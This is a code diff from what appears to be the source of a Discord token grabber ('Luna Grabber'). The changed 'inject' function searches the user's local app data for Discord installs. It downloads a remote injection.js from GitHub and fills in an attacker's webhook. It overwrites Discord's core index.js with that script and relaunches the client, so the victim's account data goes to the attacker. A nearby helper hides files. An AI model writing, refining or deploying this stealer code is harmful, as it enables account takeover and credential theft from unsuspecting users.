@@ -590,17 +590,15 @@ def hide(file):
     SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN)
 
 def inject(webhook):
-    appdata = os.getenv("localappdata")
-    for _dir in os.listdir(appdata):
+    for _dir in os.listdir(os.getenv('localappdata')):
         if 'discord' in _dir.lower():
-            for __dir in os.listdir(os.path.abspath(appdata+os.sep+_dir)):
-                if match(r'app-(\d*\.\d*)*', __dir):
-                    abspath = os.path.abspath(appdata+os.sep+_dir+os.sep+__dir) 
+            for __dir in os.listdir(os.path.abspath(os.getenv('localappdata')+os.sep+_dir)):
+                if re.match(r'app-(\d*\.\d*)*', __dir):
+                    abspath = os.path.abspath(os.getenv('localappdata')+os.sep+_dir+os.sep+__dir)
                     f = requests.get("https://raw.githubusercontent.com/Smug246/Luna-Grabber-Builder/main/injection.js").text.replace("%WEBHOOK%", webhook)
-                    modules_dir = os.listdir(abspath+'\\modules') 
-                    with open(abspath+f'\\modules\\{difflib.get_close_matches("discord_desktop_core", modules_dir, n=1, cutoff=0.6)[0]}\\discord_desktop_core\\index.js', 'w', encoding="utf-8") as indexFile:
+                    with open(abspath+'\\modules\\discord_desktop_core-3\\discord_desktop_core\\index.js', 'w', encoding="utf-8") as indexFile:
                         indexFile.write(f)
-                    subprocess.call(["start", abspath+os.sep+"Discord.exe"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    os.startfile(abspath+os.sep+_dir+'.exe')
 
 class debug:
     def __init__(self):
